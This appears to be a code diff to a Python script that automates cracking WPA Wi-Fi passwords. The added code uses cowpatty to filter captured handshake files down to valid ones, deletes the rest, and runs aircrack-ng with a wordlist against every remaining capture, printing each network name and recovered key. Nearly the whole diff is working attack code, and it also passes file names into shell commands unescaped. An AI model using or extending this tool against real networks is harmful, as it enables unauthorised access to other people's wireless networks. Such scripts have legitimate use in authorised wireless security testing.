@@ -5,6 +5,7 @@ from sys import argv
 from os  import system
 from time import sleep
 from glob import glob
+import subprocess
 
 try:
 	iface = argv[1]
@@ -57,7 +58,6 @@ if len(targets) <= 0:
 print(SUCCESS+'[+]Found {} networks'.format(str(len(targets)))+END)
 
 
-
 for t in targets:
 	bssid   = t.split('-')[0]
 	channel = t.split('-')[1]
@@ -69,8 +69,8 @@ for t in targets:
 	sleep(30)
 
 
-print(INFO+'[!]Removing unwanted files..'+END)
 system('rm *.kismet.csv *.kismet.netxml *.csv')
+
 handshakes = glob('./*.cap')
 
 if len(handshakes) <= 0:
@@ -78,7 +78,28 @@ if len(handshakes) <= 0:
 	exit(-1)
 print(SUCCESS+'[+]Captured {} handshakes'.format(str(len(handshakes)))+END)
 
-for h in handshakes:
+print(INFO+'[!]Searching for valid handshakes...'+END)
+
+valid_handshakes = []
+
+for file in handshakes:
+	child = subprocess.Popen(['cowpatty','-c','-r',file],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+	child.wait()
+	rc = child.returncode
+	if rc == 0:
+		valid_handshakes.append(file)
+	else:
+		system('rm '+file)
+
+if len(valid_handshakes) <= 0:
+	print(FAIL+'[-]No valid handshakes found'+END)
+
+
+print(SUCCESS+'[+]Captured {} valid handshakes'.format(len(valid_handshakes))+END)
+
+print(INFO+'[!]Cracking all valid handshakes...'+END)
+
+for h in valid_handshakes:
 	cmd = 'aircrack-ng -w ./wordlist {} > out'.format(h)
 	print(cmd)
 	system(cmd)
@@ -87,5 +108,3 @@ for h in handshakes:
 		essid = results.split('Encryption')[1].split('Choosing')[0].strip().split(' ')[4].strip()
 		key   = results.split('FOUND! [')[1].split(']')[0].strip()
 		print(essid,':',key)
-#TODO RATHER USE airckrack-ng f1.cap f2.cap fn.cap for getting VALID files.
-#(instead of trying evryone)
